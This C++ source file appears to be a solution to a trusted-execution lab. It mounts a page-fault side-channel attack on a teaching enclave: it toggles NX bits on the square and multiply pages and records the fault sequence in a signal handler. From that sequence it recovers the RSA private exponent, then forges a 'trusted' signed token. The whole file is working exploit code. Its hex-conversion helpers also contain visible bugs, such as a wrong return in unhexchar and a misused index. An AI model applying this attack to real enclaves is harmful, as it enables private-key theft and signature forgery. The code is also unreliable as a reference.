#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <ucontext.h>
#include <string>
#include <algorithm>
#include <iostream>
#include <vector>
#include <cmath>

using namespace std;
#include <string>

#include "framework.h"
#include "ptedit_header.h"
#include "enclave/trustlib_enclave.h"
#include "InfInt.h"

int sig_handler(int sig_num,void* page_address);
static InfInt data2int(const char* msg, int len);
static InfInt do_sign(InfInt M, InfInt exp,InfInt n);
static void hexlify(InfInt C, char* result);
static InfInt unhexlify(char* hex);
static char hexchar(int v);
static int unhexchar(char v);
int f(char s[]);
int pid;
int k=0;
void * faulted_page[2000];
void * last_page_address=NULL;
InfInt n;
char result[257];


int main() {
    pid = trustlib_init();
    
    if(pid == -1) {
        printf(TAG_FAIL "Failed to start enclave. Is " COLOR_CYAN "trustlib_enclave" COLOR_RESET " in the current folder?\n");
        return -3;
    } else {
        printf(TAG_OK "Started enclave with PID %d\n", pid);
    }

    if(ptedit_init()) {
        printf(TAG_FAIL "Could not initialize PTEditor\n");
        return -2;
    }

    
    trustlib_signed_data_t message;
    message.data.issuer = TRUSTLIB_UNTRUSTED;
    strcpy(message.data.message, "I have your key :D");  
    printf(TAG_INFO "Signing message\n");
    
    //Registering signal handler
    utee_signal_handler_t handler = sig_handler;     
    utee_register_signal_handler(handler);
    
    void * do_sign_ptr = (void *)0x411000;
    void * square_ptr = (void *)0x40a000;
    void * multiply_ptr = (void *)0x409000;
    
    ptedit_pte_clear_bit(do_sign_ptr,pid,PTEDIT_PAGE_BIT_NX);
    ptedit_pte_clear_bit(square_ptr,pid,PTEDIT_PAGE_BIT_NX);
    ptedit_pte_clear_bit(multiply_ptr,pid,PTEDIT_PAGE_BIT_NX);
    
    ptedit_pte_set_bit(do_sign_ptr,pid,PTEDIT_PAGE_BIT_NX);
    ptedit_pte_set_bit(square_ptr,pid,PTEDIT_PAGE_BIT_NX);
    ptedit_pte_set_bit(multiply_ptr,pid,PTEDIT_PAGE_BIT_NX);
    
    trustlib_sign_enclave(&message);
    
    ptedit_pte_clear_bit(do_sign_ptr,pid,PTEDIT_PAGE_BIT_NX);
    ptedit_pte_clear_bit(square_ptr,pid,PTEDIT_PAGE_BIT_NX);
    ptedit_pte_clear_bit(multiply_ptr,pid,PTEDIT_PAGE_BIT_NX);
 
    ptedit_cleanup();
    
    printf(TAG_OK "Signature(\"%s\") = %s\n", message.data.message, message.signature);
    printf(TAG_OK "Signature parameters: " COLOR_GREEN "N" COLOR_RESET " = 0x%s, " COLOR_GREEN "e" COLOR_RESET " = 0x%s\n", message.param.n, message.param.e);
    
    printf(TAG_INFO "Recovered key bits of " COLOR_MAGENTA "d" COLOR_RESET ": " COLOR_YELLOW "0b");
    
    //==========================================================================================================================
  
 //Finding the private key
    
    unsigned int key_bin[1500];
    int j =0;
    
    
    for(int i=1;i<1500;i++){
    	if (faulted_page[i]==(void*) 0x40a000 && faulted_page[i-1]==(void*) 0x409000 ){
    		key_bin[j]=1;
    		j++;	
    		}
    	else if(faulted_page[i]==(void*) 0x40a000 && faulted_page[i-1]==(void*) 0x40a000){
    		key_bin[j]=0;
    		j++;
    		
    		} 
    }
    int key_size =j;
 
    int k = key_size-1;
    int i;
    int temp;
    for(i=0; i<k; i++, k--)
    {
        temp = key_bin[i];
        key_bin[i] = key_bin[k];
        key_bin[k] = temp;
    }
    
    //coverting binary to infint
    InfInt crct_key=1;
    for(int i =1;i<key_size;i++){
    	if(key_bin[i]==1)
			crct_key = crct_key.multiply(2) +1;
    	else
			crct_key = crct_key.multiply(2);
    	}
 
    
    for(int i=0;i<key_size;i++){
		printf("%d",key_bin[i]); 
    }
    
//========================================================================================================
   //To print key in hexadecimal
    
    int key_append[1024];
    int index=0;
    while(key_size%4!=0){
    	key_append[index]=0;	
    	key_size++;
    	index++; 	   
    }
    
    for (int i=index;i<key_size;i++){
		key_append[i]=key_bin[i-index];
    }
    
    printf(COLOR_RESET "\n");
    
    char hex_d[1024];
    strcpy(hex_d, "<TODO>"); // key in hexadecimal representation
      
    int hex=0, mul=1, chk=1, rem, m=0;
    char hexDecNum[key_size];
    printf("\n");
    
    for(int p=key_size-1;p>=0;p--)
    {
   
        rem = key_append[p];
        hex = hex + (rem*mul);
        if(chk%4==0)
        {
            if(hex<10)
                hexDecNum[m] = hex+48;
            else
                hexDecNum[m] = hex+55;
				mul = 1;
				hex = 0;
				chk = 1;
				m++;
        }
        else
        {
            mul = mul*2;
            chk++;
        }
       
    }
    if(chk!=1)
        hexDecNum[i] = hex+48;
    if(chk==1)
        m--;
    
    int kk = m;
    int ii;
    char temp1;
    for(ii=0; ii<kk; ii++, kk--)
    {
        temp1 = hexDecNum[ii];
        hexDecNum[ii] = hexDecNum[kk];
        hexDecNum[kk] = temp1;
    }
    
    for(i=0;i<=m;i++){   
		hex_d[i]=hexDecNum[i];
    } 
    
    printf(TAG_OK "Key: " COLOR_CYAN "0x%s" COLOR_RESET "\n", hex_d);

//=================================================================================================================================    
    //Signing the message
    
    InfInt key_int,M,C;   

    n=unhexlify(message.param.n);
    M=data2int(message.data.message, 24);

    //Signing the message with do_sign
    C=do_sign(M,crct_key,n);
    
    //Converting into array 
    hexlify(C,message.signature);
     //setting mode to trusted
    message.data.issuer=TRUSTLIB_TRUSTED;

    // TODO: sign the message with message.data.issuer = TRUSTLIB_TRUSTED
    
    
    if(trustlib_verify_enclave(&message)) {
        printf(TAG_OK "Verification succeeded\n");
    } else {
        printf(TAG_FAIL "Verification failed\n");
    }
    
    FILE *f = fopen("trustedtoken", "wb");
    fwrite(&message, sizeof(message), 1, f);
    fclose(f);
    
    printf(TAG_OK "Saved trusted message as '" COLOR_GREEN "trustedtoken" COLOR_RESET "'\n");
    return 0;
    
}

static InfInt data2int(const char* msg, int len) {
    InfInt M = 0;
    while(len--) {
        M = (M * 256) + *msg;
        msg++;
    }
    return M;
}

static InfInt do_sign(InfInt M, InfInt exp,InfInt n) {
    
    
    // C = (M ^ exp) % n
    InfInt C = 1;
    while(exp > 0) {
        if((exp % 2).toInt()) {
            C.multiply(M);
        }
        M.square();
        exp /= 2;
        
        C.reduce(n); // C % n;
        M.reduce(n); // M % n;
    }
    
    return C;
}

static InfInt unhexlify(char* hex) {
    InfInt r = 0;
    while(*hex) {
        r *= 16;
        r += unhexchar(*hex);
        hex++;
    }
    return r;
}

static void hexlify(InfInt C, char* result) {
    char buffer[1024];
    buffer[1023] = 0;
    int ptr = 1022;
    while(C > 0) {
        buffer[ptr--] = hexchar((C % 16).toInt());
        C /= 16;
        if(ptr < 0) return;
    }
    strcpy(result, buffer + ptr + 1);
}

static char hexchar(int v) {
    if(v >= 0 && v <= 9) return v + '0';
    if(v >= 10 && v <= 15) return v + 'a' - 10;
    return 0;
}
static int unhexchar(char v) {
    if(v >= '0' && v <= '9') return v - '0';
    if(v >= 'a' && v <= 'f') return v - 'a' + 10;
    if(v >= 'A' && v <= 'F') return v = 'A' + 10;
    return 0;
}

int sig_handler(int sig_num,void* page_address){

    if (page_address == (void*) 0x40a000 || page_address == (void*) 0x409000){
    
		faulted_page[k]=page_address;
		k=k+1;
    }

    if(last_page_address != nullptr){
		ptedit_pte_set_bit(last_page_address,pid,PTEDIT_PAGE_BIT_NX);
    }
    
    ptedit_pte_clear_bit(page_address,pid,PTEDIT_PAGE_BIT_NX);
    last_page_address = page_address;
    
    return 0;
    }
    
    
